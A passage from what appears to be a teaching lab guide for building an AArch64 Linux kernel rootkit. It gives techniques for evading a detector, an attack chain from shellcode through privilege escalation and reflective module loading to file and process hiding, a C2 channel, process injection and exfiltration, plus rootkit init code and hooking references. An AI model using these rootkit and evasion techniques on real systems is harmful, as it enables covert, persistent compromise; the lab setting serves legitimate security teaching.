**Detector 4-6 (memfd/commit_creds/finit_module):** These watch specific syscalls/functions. To evade: use alternative techniques (manual ELF loading instead of `finit_module`, direct cred structure modification instead of `commit_creds`).

**Detector 7 (ftrace):** SNITCH watches `register_ftrace_function`. To evade: use kprobes, syscall table patching, or inline hooking instead.

**Detector 8 (kthread_use_mm):** SNITCH watches this function used for injection. To evade: use `access_process_vm()` from a non-kthread context, or PTE-based injection (kinject Part 4).

The baseline approach: just `rmmod snitch` after getting root. The +20 bonus is for evading it while it's active.

---

## 9. Stage 7 — End-to-End Integration

### 9.1 The Full Chain

The demo should look like this (single session, no manual intervention):

```bash
# 1. Initial Access — beachhead shellcode
python3 tools/send_shellcode.py shellcode/beachhead.bin localhost 11337
# → now have shell as analyst

# 2. Privilege Escalation
./exploit_rwx                  # or exploit_privesc for grad
id                              # uid=0(root) gid=0(root)

# 3. Reflective Module Loading
./loader rootkit.ko            # loads without insmod

# 4. Verify rootkit
./mykill status                 # all subsystems active
ls /tmp/secret                  # "no such file or directory" (hidden!)
cat /tmp/secret/flag.txt        # "permission denied" (blocked!)

# 5. Become operator
./mykill add-gid $$             # GID 1337 → can see everything
cat /tmp/secret/flag.txt        # works now

# 6. Exfiltrate PIRs
cat /home/director/classified/agents.txt
cat /home/director/classified/operation_blackbird.txt
cat /home/director/classified/crypto_keys.txt

# 7. Test injection
sleep 300 &
./mykill inject $! tools/inject_test.bin
cat /tmp/pwned                  # "INJECTED-1337 pid=..."

# 8. Cleanup
./mykill hide-module            # show module for rmmod
sudo rmmod rootkit              # clean unload
```

### 9.2 The `rootkit_init()` Ordering

The initialization order matters because some subsystems depend on others:

```c
static int __init rootkit_init(void) {
    int ret;
    
    // 1. File hiding first — so staging path is hidden immediately
    ret = file_hide_init();
    if (ret) return ret;
    
    // 2. Access blocking — so protected paths are blocked
    ret = blocking_init();
    if (ret) goto undo_file_hide;
    
    // 3. Process hiding — so operator processes are hidden
    ret = proc_hide_init();
    if (ret) goto undo_blocking;
    
    // 4. C2 channel — so we can receive commands
    ret = c2_init();
    if (ret) goto undo_proc_hide;
    
    // 5. Injection subsystem
    ret = inject_init();
    if (ret) goto undo_c2;
    
    // 6. Hide ourselves
    hide_module();
    
    return 0;
    
// Error unwinding in reverse order:
undo_c2:       c2_exit();
undo_proc_hide: proc_hide_exit();
undo_blocking: blocking_exit();
undo_file_hide: file_hide_exit();
    return ret;
}
```

### 9.3 Clean Teardown

`rootkit_exit()` reverses everything:
1. Show module (if hidden)
2. Unregister injection subsystem
3. Unregister C2 kprobe
4. Unregister process hiding kretprobe
5. Unregister access blocking ftrace hook
6. Unregister file hiding kretprobe

**Every hook must be unregistered.** A leftover kretprobe on a syscall will crash the kernel when the handler code is unmapped after `rmmod`.

---

## 10. Appendix: AArch64 Primer

### 10.1 Register Convention

| Register | ABI Name | Purpose |
|---|---|---|
| x0-x7 | — | Function arguments / syscall arguments / return values |
| x8 | — | Syscall number |
| x9-x15 | — | Temporary (caller-saved) |
| x16-x17 | IP0/IP1 | Intra-procedure-call scratch |
| x18 | PR | Platform register |
| x19-x28 | — | Callee-saved (preserved across calls) |
| x29 | FP | Frame pointer |
| x30 | LR | Link register (return address) |
| SP | — | Stack pointer |
| PC | — | Program counter |

### 10.2 Syscall Convention

```asm
mov  x8, #<syscall_number>    // syscall number in x8
mov  x0, #<arg1>              // first argument
mov  x1, #<arg2>              // second argument
// ... up to x5 for 6 arguments
svc  #0                        // supervisor call (trap to kernel)
// Return value in x0
```

### 10.3 Key AArch64 Syscall Numbers

| Syscall | Number | Signature |
|---|---|---|
| `openat` | 56 | `openat(dfd, filename, flags, mode)` |
| `close` | 57 | `close(fd)` |
| `write` | 64 | `write(fd, buf, count)` |
| `read` | 63 | `read(fd, buf, count)` |
| `ppoll` | 73 | `ppoll(fds, nfds, timeout, sigmask)` |
| `kill` | 129 | `kill(pid, sig)` |
| `getpid` | 172 | `getpid()` |
| `getppid` | 173 | `getppid()` |
| `clone` | 220 | `clone(flags, stack, ptid, tls, ctid)` |
| `execve` | 221 | `execve(filename, argv, envp)` |
| `dup3` | 24 | `dup3(oldfd, newfd, flags)` |
| `memfd_create` | 279 | `memfd_create(name, flags)` |
| `finit_module` | 273 | `finit_module(fd, param_values, flags)` |

### 10.4 PIC Shellcode: ADR vs ADRP

```asm
adr  x0, label     // x0 = PC + offset (±1MB range, byte-aligned)
adrp x0, label     // x0 = (PC & ~0xFFF) + (offset << 12) (±4GB page range)
```

`adr` is your primary tool for PIC shellcode — it computes an address relative to the current PC. Data strings placed after your code can be referenced with `adr`.

### 10.5 Instruction Cache Coherency

AArch64 has separate instruction and data caches. When you write machine code to memory (as data), the instruction cache doesn't automatically see it. Before executing freshly-written code:

```c
// In kernel:
flush_icache_range(start, end);

// In userspace (via syscall):
__builtin___clear_cache(start, end);
```

The `vuln_rwx` driver calls `flush_icache_range()` for you. Your reflective loader and injection code may need to handle this explicitly.

---

## Quick-Reference: Hooking Mechanisms Compared

| Mechanism | Scope | Sleep OK? | Detectable? | Used For |
|---|---|---|---|---|
| **kprobe** | Pre-handler (before function) | No | `/sys/kernel/debug/kprobes/list` | C2 (kill hook) |
| **kretprobe** | Post-handler (after function) | No (atomic) | Same as kprobe | File hiding, process hiding |
| **ftrace** | Callback at function entry | Depends on wrapper | `register_ftrace_function` call | Path access blocking |
| **syscall table patch** | Replace syscall handler | N/A | Memory scan of `sys_call_table` | Alternative to kprobe/ftrace |
| **inline hook** | Patch first instructions | N/A | Code integrity scan | Alternative hooking |

---

## Quick-Reference: Key Kernel Data Structures

```c
// Process descriptor — one per thread
struct task_struct {
    struct list_head    tasks;       // links in the global task list
    pid_t               pid;        // process ID
    struct mm_struct    *mm;         // memory map (NULL for kthreads)
    const struct cred   *cred;      // credentials (uid, gid, caps)
    char                comm[16];   // executable name
    // ... hundreds more fields
};

// Credentials — shared, copy-on-write
struct cred {
    kuid_t  uid, suid, euid, fsuid;
    kgid_t  gid, sgid, egid, fsgid;
    struct group_info *group_info;   // supplementary groups
    // ... capabilities, keyrings
};

// Supplementary groups
struct group_info {
    int     ngroups;
    kgid_t  gid[];                   // flexible array of group IDs
};

// Directory entry (returned by getdents64)
struct linux_dirent64 {
    u64     d_ino;                   // inode number
    s64     d_off;                   // offset to next entry
    unsigned short d_reclen;         // length of this entry
    unsigned char  d_type;           // file type
    char    d_name[];                // filename (null-terminated)
};
```
